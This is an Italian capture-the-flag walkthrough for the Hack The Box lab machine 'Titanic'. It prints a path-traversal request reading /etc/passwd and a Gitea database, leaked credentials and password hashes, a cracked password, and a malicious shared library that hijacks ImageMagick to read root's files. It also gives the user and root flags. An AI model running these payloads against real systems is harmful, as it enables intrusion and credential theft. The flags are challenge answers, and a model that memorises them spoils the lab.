# TITANIC

ip: 10.10.11.55

sito: titanic.htb

# NMAP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-19 18:35 CEST
Nmap scan report for 10.10.11.55
Host is up (0.52s latency).
Not shown: 936 closed tcp ports (reset), 62 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.43 seconds

# Exploit

Visito il sito -> posso solo prenotare un viaggio

Mando il form con burp aperto e noto che il json che si scarica viene inserito nei parametri.

Faccio tampering e inserendo

`/download?ticket=../../../../../../etc/passwd`

ottengo in output il contenuto del file -> VULNERABILE A LFI

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

# USER FLAG

0ce1238e1d32a1054620672eb98c49a5



# PRIVESC

stampando anche il file hosts noto:

> 127.0.0.1 localhost titanic.htb dev.titanic.htb  
> 127.0.1.1 titanic  
> ...    

Ci sono dei sottodomini. Navigo a dev.titanic.htb dopo averlo aggiunto al file hosts -> GITEA (una versione locale di git)

Navigando dev.titanic.htb, trovo la repository dell'app (FLASK!), ma non sembra troppo interessante. 

C'é una seconda repository con dei file di configurazione per docker. 


Nel file di mySQL trovo:

```YAML
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

provo ad accedere alla porta 3306 della vm con le credenziali trovate:  `mysql root@10.10.11.55:3306` -> non funziona la connessione.

Fuzzo un altro po' e provo a a scaricare il database di gitea, solitamente in data/gitea.db: (Cercando online)

> titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db


Nel DB c'è la tabella users, che contiene username e password di developer e di root (immagino siano per l'ssh).

> root:cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136  
> con salt 2d149e5fbd1b20cf31db3e3c6a28fc9b  
> 
> developer:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56  
> con salt:  8bf3e3452b78544f8bee9400d6936d34


c'è anche scritto che l'algoritmo di hash è `pbkdf2$50000$50`. Cerco online uno script per crackarlo, dato che hashcat e john sono più lenti.

> Developer: 25282528

> Root: 

Mentre la password di root finisce di essere crackata, entro in ssh su developer:

> ssh developer@10.10.11.55

in /opt/scripts c'é uno script che viene eseguito da root e usa magick

cerco la versione con `magick --version`. trovo un exploit che usa la libreria a runtime

```bash
cd /opt/app/static/assets/images
 
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/rootflag");
    exit(0);
}
EOF
```

faccio partire lo script modificando un file `cp home.jpg home2.jpg`

## ROOT FLAG
36277de7a6a2b70fd45ab6156d71cd00





